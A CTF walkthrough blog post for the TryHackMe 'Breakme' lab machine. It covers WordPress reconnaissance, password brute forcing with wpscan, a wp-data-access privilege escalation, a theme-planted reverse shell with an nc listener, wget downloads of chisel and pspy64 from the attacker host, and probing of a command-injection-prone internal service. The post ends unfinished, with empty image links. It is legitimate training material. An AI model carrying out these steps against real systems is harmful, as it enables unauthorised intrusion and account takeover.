---
title: CTF Walkthrough for TryHackMe Machine Breakme
date: 2024-09-27 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup, Command Injection, WordPress, Reverse Engineering]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/box-breakme.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Breakme a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Breakme<br>
Difficulty: Medium<br>
Operating System: Linux<br>
Machine link: [Breakme](https://tryhackme.com/r/room/breakmenu)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) Zaproxy<br>
4) Chisel<br>
5) Cutter<br>
6) Wpscan<br>

## Reconnaissance

We will start by performing a service scan on the target to enumerate services running on open ports.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Service]
└─$ sudo nmap -n 10.10.64.230 -sV -sC -oN service-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 19:03 BST
Nmap scan report for 10.10.64.230
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA)
|   256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA)
|_  256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.24 seconds  
```

The target runs a web server and an SSH server. In our scan result we can see that the index page of the root directory is the default Apache index page so, let's fuzz the web application to discover hidden directories.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]
└─$ ffuf -ic -c -u http://10.10.64.230/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php,.txt.html

<SNIP>
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 308ms]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2805ms]
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 97ms]
manual                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 248ms]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 96ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 93ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 98ms]
:: Progress: [661638/661638] :: Job [1/1] :: 414 req/sec :: Duration: [0:28:55] :: Errors: 0 ::
```

The result above shows us an interesting directory i.e. wordpress, this may tell us that our target runs WordPress CMS. We can confirm our assumption by visiting this directory.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/1-browse.png)

We can see that our target's web application indeed uses the WordPress CMS. We can start a quick enumeration on the target WordPress instance by enumerating for vulnerable plugins.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]               
└─$ wpscan --url http://10.10.64.230/wordpress/ -e vp        
<SNIP>
[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://10.10.64.230/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2024-09-18T00:01:00.000Z
 | [!] The version is out of date, the latest version is 5.5.14
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.64.230/wordpress/wp-content/plugins/wp-data-access/readme.txt

<SNIP>
[+] Elapsed time: 00:00:15
```

This enumeration shows that the WordPress instance uses an outdated version of the wp-data-access plugin. Version 5.3.5 used by our target appears to be vulnerable to a privilege escalation vulnerability.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/vuln-discovery.png)

This vulnerability requires us to have an account on the targeted WordPress instance. Now we need to find valid user credentials to log into the WordPress instance. We can do this by first enumerating valid usernames.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]                           
└─$ wpscan --url http://10.10.64.230/wordpress/ -e u  
<SNIP>

[+] Enumerating Users (via Passive and Aggressive Methods) 
 Brute Forcing Author IDs - Time: 00:00:02 <===============================================================================================================> (10 / 10) 100.00% Time: 00:00:02                
[i] User(s) Identified:   
[+] admin                                                 
 | Found By: Author Posts - Author Pattern (Passive Detection)                   
 | Confirmed By:                                          
<NIP>                               
[+] bob                                                                
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)     
 | Confirmed By: Login Error Messages (Aggressive Detection)                     
<SNIP>                        
[+] Elapsed time: 00:00:09                 
```

The enumeration was successful and we found two valid usernames. We can attempt a password brute force attack using these usernames. 
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]
└─$ echo "bob\nadmin" > ../../Misc\ File/usernames.txt   

┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]
└─$wpscan -U ../../Misc\ File/usernames.txt -P /usr/share/wordlists/seclists/Passwords/probable-v2-top207.txt --url http://10.10.64.230/wordpress/ 
<SNIP>

[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - bob / <REDACTED>

Trying admin / casper Time: 00:00:17 <=======================================================================                                             > (347 / 554) 62.63%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: bob, Password: <REDACTED>

<SNIP>
[+] Memory used: 265.699 MB
[+] Elapsed time: 00:00:26     
```

The password brute force attack was successful and we have obtained Bob's password. we can use this password to log into the WordPress instance.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/wordpress-login.png){: .center}
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/after-login.png)

This account appears to be a low privilege account and we can do anything with this. Remember above that the target uses the vulnerable version of the wp-data-access plugin that can allow us to escalate our privileges. This [article](https://www.wordfence.com/blog/2023/04/privilege-escalation-vulnerability-patched-promptly-in-wp-data-access-wordpress-plugin/) explains the nature of the vulnerability. To exploit this vulnerability, we can click on Bob's profile picture on the top right corner of the dashboard page and select update. Now, we need to set our proxy to intercept mode and click the update button at the bottom of the profile.php page. We can now add the wpda_role[] parameter and give it the administrator value. This will grant us admin privileges on the website.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/vuln-exploit.png)

After modifying the POST request we can send it and we will notice a change in Bob's panel. This change is because Bob's role has been upgraded to that of an administrator.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/vuln-exploit-proof.png)

Now that we have admin access to the website we can modify a theme's page by adding a reverse shell payload to it. We can add this payload to an unused theme e.g. twentytwentythree in his case.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/theme-change.png)

We then need to start a listener on our attack host and access the page that contains our payload to trigger its execution.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]
└─$ curl http://10.10.64.230/wordpress/wp-content/themes/twentytwentythree/patterns/hidden-404.php
```

When we return to our listener we will notice a reverse connection from the target. We can upgrade this shell to a fully interactive shell to facilitate our enumeration.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.8.23.19] from (UNKNOWN) [10.10.64.230] 38510
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")' 
<ress/wp-content/themes/twentytwentythree/patterns$ ^Z
zsh: suspended  nc -lvnp 1234


┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
www-data@Breakme:/var/www/html/wordpress/wp-content/themes/twentytwentythree/patterns$ 
```
Now, we have a foothold on the target and we can use this to enumerate the target further. If we look at the ports listening internally on the target, we will notice and uncommon port listener to the internal IP 127.0.0.1.
```bash
www-data@Breakme:/tmp$ netstat -nlt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:9999          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN  
```

To enumerate this port, we can transfer Chisel and pspy64 to the target. To do this, we first need to start a Python server in the directory where these binaries are located.
```bash
┌──(pentester㉿kali)-[/opt]
└─$ ls -l
<SNIP>
-rwxr-xr-x 8 root root    4096 Sep 24 16:49 pspy64
-rw-r--r-- 1 root root 8654848 Aug 20  2023 chisel

┌──(pentester㉿kali)-[/opt]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We can now use wget on the target to download this binary from our attack host.
```bash
www-data@Breakme:/tmp$ wget 10.8.23.19/chisel
--2024-09-26 17:30:37--  http://10.8.23.19/chisel; chmod 755 chisel             
2024-09-26 17:30:41 (2.26 MB/s) - ‘chisel’ saved [8654848/8654848]
<SNIP>

www-data@Breakme:/tmp$ wget 10.8.23.19/pspy64; chmod 755 pspy64
--2024-09-26 23:33:08--  http://10.8.23.19/pspy64
<SNIP>    
2024-09-26 23:33:12 (1008 KB/s) - ‘pspy64’ saved [3104768/3104768]
```

We can now run Chisel on our target using the server option in the background and run pspy64 to track the server's execution flow.
```bash
www-data@Breakme:/tmp$ ./chisel server -p 4444 &
[1] 1417
www-data@Breakme:/tmp$ 2024/09/26 23:34:53 server: Fingerprint acOc0jhUsJnFUCyfbA1YF9Z5aPDK01T2iw450PPmRJ8=
2024/09/26 23:34:53 server: Listening on http://0.0.0.0:4444
www-data@Breakme:/tmp$./pspy64  
```

On our attack host, we need to run Chisel with the client option to connect to Chisel's server running on the target. This setup will route all traffic sent to our local port 9999 to the target port 9999 listening on 127.0.0.1.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Breakme/Scans/Web]
└─$ chisel client 10.10.230.208:4444 9999:127.0.0.1:9999
2024/09/27 04:13:58 client: Connecting to ws://10.10.230.208:4444
2024/09/27 04:13:58 client: tun: proxy#9999=>9999: Listening
2024/09/27 04:14:00 client: Connected (Latency 307.622434ms)
```

Now that our local port 9999 routes traffic to the target port 9999 listening on the internal IP address, we can conduct a service scan on our local port to enumerate the service running on this particular port.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Breakme]
└─$ nmap -sV -sC  127.0.0.1 -p9999
<SNIP>
PORT     STATE SERVICE VERSION
9999/tcp open  http    PHP cli server 5.5 or later (PHP 7.4.33)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Test

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.82 seconds
```

A web server appears to listen on this port. We can access this web application from our browse.
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/2-browse.png)

This web application helps in checking an IP address, the existence of a user, and the existence of a file. Upon entering values to each of these fields, we will notice that our input is been used in executing special commands on the system. This can be seen with the help of pspy64 we ran earlier.
When we enter an IP address to check we will see that the IP address is checked with the ping command.
```bash
2024/09/26 23:35:54 CMD: UID=1002  PID=1430   | /usr/bin/php -S 127.0.0.1:9999 
2024/09/26 23:35:54 CMD: UID=1002  PID=1431   | sh -c ping -c 2 127.0.0.1 >/dev/null 2>&1 & 
```
When we enter a username we will see that the username entered is checked with the id command.
```bash
2024/09/26 23:37:34 CMD: UID=1002  PID=1434   | /usr/bin/php -S 127.0.0.1:9999 
2024/09/26 23:37:34 CMD: UID=1002  PID=1435   | sh -c id john >/dev/null 2>&1 & 
```
Lastly, when we enter a file name we will see that the file name entered is checked with the find command.
```bash
2024/09/26 23:39:06 CMD: UID=1002  PID=1444   | /usr/bin/php -S 127.0.0.1:9999       
2024/09/26 23:39:06 CMD: UID=1002  PID=1445   | sh -c find /opt -name "filename" 2>/dev/null 
```





## Post Exploitation

![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/)
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/)
![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/)



![](/assets/img/posts/walthrough/tryhackme/2024-09-27-breakme/)
